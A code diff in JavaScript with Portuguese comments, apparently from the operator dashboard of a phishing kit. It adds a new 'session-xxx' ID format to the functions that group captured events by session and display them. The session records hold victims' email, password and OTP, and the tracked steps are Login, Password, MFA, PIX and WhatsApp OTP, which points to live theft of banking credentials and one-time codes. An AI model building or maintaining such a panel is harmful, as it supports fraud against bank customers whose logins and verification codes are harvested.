@@ -1552,6 +1552,9 @@
     // Formato novo: "nome [IP]" ou apenas "IP" (IPv4 ou IPv6)
     const matchIp = usuario.match(/^(.*?)\s*\[([\da-f:.]+)\]$/i);
     if (matchIp && (isValidIp(matchIp[2]))) return { nome: matchIp[1].trim() || null, sid: matchIp[2] };
+    // Formato novo: "nome [session-xxxxx]" ou apenas "session-xxxxx"
+    const matchSession = usuario.match(/^(.*?)\s*\[(session-[a-z0-9]+)\]$/i);
+    if (matchSession) return { nome: matchSession[1].trim() || null, sid: matchSession[2] };
     // Formato antigo: "nome [#ID]" ou apenas "#ID"
     const matchHash = usuario.match(/^(.*?)\s*\[(#[A-Z0-9]+)\]$/);
     if (matchHash) return { nome: matchHash[1].trim() || null, sid: matchHash[2] };
@@ -1559,6 +1562,8 @@
     if (isValidIp(usuario)) return { sid: usuario, nome: null };
     // Apenas #ID (formato antigo)
     if (/^#[A-Z0-9]+$/.test(usuario)) return { sid: usuario, nome: null };
+    // Apenas "session-xxxxx" (sem nome)
+    if (/^session-[a-z0-9]+$/i.test(usuario)) return { sid: usuario, nome: null };
     return { sid: null, nome: usuario };
   }
 
@@ -1569,12 +1574,13 @@
     const rankStatus = { error: 3, warning: 2, success: 1, info: 0 };
     const stepNames  = { s1:'Login', s2:'Senha', s3:'MFA', s4p:'PIX', s4w:'WhatsApp OTP' };
 
-    // Processa eventos — só usa como chave session IDs válidos (IPs ou #XXXXX)
+    // Processa eventos — só usa como chave session IDs válidos (IPs, #XXXXX ou session-xxx)
     for (const evt of state.events) {
       const { sid, nome } = parsearUsuario(evt.usuario);
       // Ignora registros sem session ID válido
-      const isValidHash = /^#[A-Z0-9]+$/.test(sid || '');
-      if (!sid || (!isValidIp(sid) && !isValidHash)) continue;
+      const isValidHash    = /^#[A-Z0-9]+$/.test(sid || '');
+      const isValidSession = /^session-[a-z0-9]+$/i.test(sid || '');
+      if (!sid || (!isValidIp(sid) && !isValidHash && !isValidSession)) continue;
 
       if (!sessions.has(sid)) {
         sessions.set(sid, { sid, email: null, senha: null, otp: null, step: 'Login', status: 'info', ip: null, lastSeen: evt.created_at, isWaiting: false });
@@ -2089,8 +2095,8 @@
   function formatarUsuario(usuario) {
     if (!usuario) return '<span style="color:#9ca3af;">—</span>';
 
-    // Formato: "email@x.com [#A3F7B2]"
-    const match = usuario.match(/^(.*?)\s*\[(#[A-Z0-9]+)\]$/);
+    // Formato: "email@x.com [#A3F7B2]" ou "email@x.com [session-xxxxx]"
+    const match = usuario.match(/^(.*?)\s*\[(#[A-Z0-9]+|session-[a-z0-9]+)\]$/i);
     if (match) {
       return `
         <div style="line-height:1.4;">
@@ -2099,8 +2105,8 @@
         </div>`;
     }
 
-    // Só session ID (#XXXXXX)
-    if (/^#[A-Z0-9]+$/.test(usuario)) {
+    // Só session ID (#XXXXXX ou session-xxxxx)
+    if (/^(#[A-Z0-9]+|session-[a-z0-9]+)$/i.test(usuario)) {
       return `<span style="font-family:monospace;font-size:12px;font-weight:700;color:#1FB28A;background:#d4f5ec;padding:2px 8px;border-radius:12px;">${escapeHtml(usuario)}</span>`;
     }
 
